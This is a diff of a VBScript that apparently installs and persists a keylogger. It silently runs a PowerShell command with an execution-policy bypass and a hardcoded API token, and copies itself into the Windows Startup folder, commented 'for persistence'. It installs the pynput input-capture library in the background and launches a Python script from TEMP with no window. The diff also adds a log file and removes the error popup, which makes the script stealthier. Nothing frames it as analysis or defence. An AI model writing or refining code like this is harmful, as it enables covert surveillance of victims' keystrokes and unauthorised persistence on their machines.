@@ -1,6 +1,17 @@
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
+' Define the TEMP folder path
+tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
+logFile = tempPath & "\log.txt"
+
+' Create log.txt if it does not exist
+If Not objFSO.FileExists(logFile) Then
+    Set objFile = objFSO.CreateTextFile(logFile, True)
+    objFile.WriteLine "Log file created on: " & Now
+    objFile.Close
+End If
+
 ' Define PowerShell script
 psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & _
     """$API_TOKEN='a4mbuegdv65j65d9buc4bzxezrsf4w'; " & _
@@ -17,25 +28,18 @@ psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & _
 ' Run the PowerShell command (silent mode)
 objShell.Run "cmd /c " & psCommand, 0, True
 
-' Get the path to the Startup folder
+' Copy itself to the Startup folder for persistence
 startupPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\"
-
-' Get the path to the current script
 currentScript = WScript.ScriptFullName
-
-' Copy the script to the Startup folder
 objFSO.CopyFile currentScript, startupPath & "b.vbs", True
 
 ' Install pynput in the background
 objShell.Run "cmd /c ""pip install pynput""", 0, True
 
-' Define the path to the Python script in the %TEMP% directory
-tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
+' Define the path to the Python script in the TEMP directory
 pythonScript = tempPath & "\a.py"
 
 ' Check if the Python script exists before running
 If objFSO.FileExists(pythonScript) Then
     objShell.Run "cmd /c ""pythonw """ & pythonScript & """", 0, False
-Else
-    objShell.Popup "Error: a.py not found in TEMP folder", 5, "Script Error", 16
 End If
